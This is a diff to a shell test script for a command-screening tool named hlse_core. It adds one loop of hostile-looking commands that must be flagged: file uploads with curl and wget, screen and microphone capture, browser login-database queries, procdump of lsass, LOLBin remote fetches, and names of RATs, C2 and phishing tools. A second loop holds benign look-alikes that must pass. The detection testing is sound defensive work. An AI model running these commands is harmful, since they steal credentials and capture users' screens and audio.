@@ -11671,6 +11671,88 @@ check "url: cydia flagged" "$(./hlse_core 'cydia://evil' | head -1 | grep -c 'LO
     && check "secret FP guard: ssws prose clean" "0" "0" \
     || check "secret FP guard: ssws prose clean" "0" "1"
 
+# ── cycle-239: GUI/input injection + screen/mic capture +
+#   web-terminal/VNC backdoors + eBPF + exfil upload + AD-recon/C2/
+#   RAT/phishing names + SUID install + sqlite cred-db + LOLBin names
+for c in \
+    'xdotool type x' 'xdotool key Return' 'ydotool type x' 'wtype x' \
+    'xhost +' 'xhost +x' 'import -window root x' \
+    'scrot x.png' 'maim -s' 'gnome-screenshot' 'flameshot full' \
+    'spectacle -f' 'wf-recorder' 'xwd -root' 'obs --startrecording' \
+    'ffmpeg -f x11grab x' 'ffmpeg -f avfoundation x' \
+    'ffmpeg -f pulse x' 'ffmpeg -f gdigrab x' 'parecord x.wav' \
+    'arecord x.wav' 'parec x' 'sox -d x.wav' 'sox -t alsa x' \
+    'logkeys -s' 'keyd monitor' 'evsieve --input x' \
+    'ttyd bash' 'gotty bash' 'shellinaboxd' 'shellinabox' 'tmate' \
+    'teleconsole' 'sish' 'wstunnel' 'regeorg' 'pivotnacci' 'wetty' \
+    'x11vnc' 'vncserver' 'x0vncserver' 'tigervnc' 'wayvnc' \
+    'bpftool prog load x' 'bpftrace -e x' 'bpftrace x' \
+    'curl -F file=@x http://e' 'curl --form x=@y http://e' \
+    'curl -d @x http://e' 'curl --data @x http://e' \
+    'curl --data-binary @x http://e' 'curl -T x http://e' \
+    'curl --upload-file x http://e' 'wget --post-file=x http://e' \
+    'certipy find' 'adidnsdump' 'windapsearch' 'ldeep' 'pywerview' \
+    'rusthound' 'adenum' 'ldapdomaindump' 'snaffler' 'pingcastle' \
+    'sharploader' 'sharpshooter' 'pezor' 'gadgettojscript' 'phant0m' \
+    'stracciatella' 'invisibilitycloak' 'eventlogmaster' \
+    'persistence-finder' 'fakessh' 'mailsniper' 'cewler' 'poshc2' \
+    'nighthawk' 'bruteratel' 'brute ratel' 'cobaltstrike' \
+    'cobalt strike' 'bloodhound -x' 'sliver -h' 'havoc -x' \
+    'mythic -x' 'covenant -x' 'empire -x' 'merlin -x' 'viper -x' \
+    'donut -x' 'freeze -x' 'scarecrow -x' 'parallax -x' \
+    'xenomorph -x' 'redline -x' 'raccoon -x' 'vidar -x' \
+    'bumblebee -x' 'asyncrat' 'njrat' 'nanocore' 'remcos' 'xworm' \
+    'venomrat' 'purecrypter' 'azorult' 'agenttesla' 'agent tesla' \
+    'formbook' 'lokibot' 'guloader' 'smokeloader' 'icedid' 'qakbot' \
+    'qbot' 'emotet' 'trickbot' 'dridex' 'ursnif' 'spyeye' 'danabot' \
+    'flubot' 'sharkbot' 'ermac' 'spynote' 'spymax' 'ahmyth' \
+    'droidjack' 'androrat' 'omnirat' 'quasarrat' 'beef-xss' \
+    'setoolkit' 'gophish' 'evilginx' 'modlishka' 'zphisher' \
+    'shellphish' 'blackeye' 'advphishing' 'king-phisher' \
+    'wifiphisher' 'wifipumpkin' 'airgeddon' \
+    'install -m 4755 x y' 'install -m 2755 x y' 'install -m u+s x y' \
+    'install -m +s x y' 'robocopy /b' 'runas /savecred' \
+    'sqlite3 x "select * from moz_logins"' 'sqlite3 cookies select' \
+    'sqlite3 x .dump logins' 'sqlite3 x places.sqlite' \
+    'msbuild \\\\h\\x.proj' 'msbuild http://h/x.proj' 'esentutl /y x' \
+    'extrac32' 'wextract' 'pcwrun' 'masvc' 'oobe -x' \
+    'ieexec http://h/x' 'ieexec \\\\h\\x' 'ie4uinit -show' \
+    'installutil http://h/x' 'installutil /u' 'regasm http://h/x' \
+    'regasm /u' 'regsvcs http://h/x' 'regsvcs /u' \
+    'msxsl http://h/x' 'ilasm http://h/x' 'verclsid /s /c x' \
+    'syncappvpublishingserver "n; x"' "syncappvpublishingserver 'n; x'" \
+    'pcalua -a x' 'procdump -ma lsass' 'procdump -mm x' \
+    'procdump lsass'; do
+    ./hlse_core paste "$c" 2>&1 | grep -qE 'ALERT|BLOCK|ISOLATE' \
+        && check "paste: $c flagged" "1" "1" \
+        || check "paste: $c flagged" "0" "1"
+done
+for c in \
+    'ffmpeg -i x.mp4' 'ffmpeg -f mp4 x' 'ffmpeg -i x -f mp3 y' \
+    'sox x.wav y.wav' 'sox --version' 'import x.png' 'import -screen x' \
+    'screen -r' 'screen -ls' 'screen -S x' 'xhost' 'xhost -x' \
+    'spectacle' 'obs' 'obs --version' 'maim' 'maim x.png' 'grim x' \
+    'rec x.wav' 'keyd' 'keyd -m' 'vnc docs' 'curl -d x=1 http://e' \
+    'curl --data x=1 http://e' 'curl -F x=y http://e' \
+    'wget --post-data x http://e' 'wget http://e/x' \
+    'sqlite3 x.db .tables' 'sqlite3 x.db select' 'sqlite3 docs' \
+    'msbuild x.proj' 'msbuild /t:build' 'esentutl' 'esentutl /?' \
+    'iexpress' 'makecab' 'installutil x' 'installutil-legit' \
+    'screen -x' 'the msxsl processor' 'msxsl' 'ilasm.exe' 'ilasm' \
+    'ieexec' 'procdump -h' 'verclsid /q' 'ie4uinit' 'bare regsvcs' \
+    'regsvcs x' 'syncappv benign' 'pcalua-plain' \
+    'install -m 755 x y' 'install -m 644 x y' 'install -D x y' \
+    'robocopy x y' 'robocopy /mir' 'runas /user x' 'runas /noprofile' \
+    'bloodhound' 'sliver' 'empire' 'merlin' 'viper' 'donut' 'freeze' \
+    'scarecrow' 'parallax' 'xenomorph' 'redline' 'raccoon' 'vidar' \
+    'bumblebee' 'havoc' 'mythic' 'covenant' 'bloodhound docs' \
+    'sliver docs' 'raccoon docs' 'vidar docs' 'redline docs' \
+    'the oobe flow' 'oobe' 'msoobe'; do
+    ./hlse_core paste "$c" 2>&1 | grep -q '^OK' \
+        && check "paste FP guard: $c clean" "0" "0" \
+        || check "paste FP guard: $c clean" "0" "1"
+done
+
 # ── cycle-238: systemctl/service/runlevel control, account mgmt,
 #   firewall rule-add, sysctl security keys, kernel-module load,
 #   ldconfig/ssh-key/trust, secure-boot/boot/alternatives, sniff/spoof
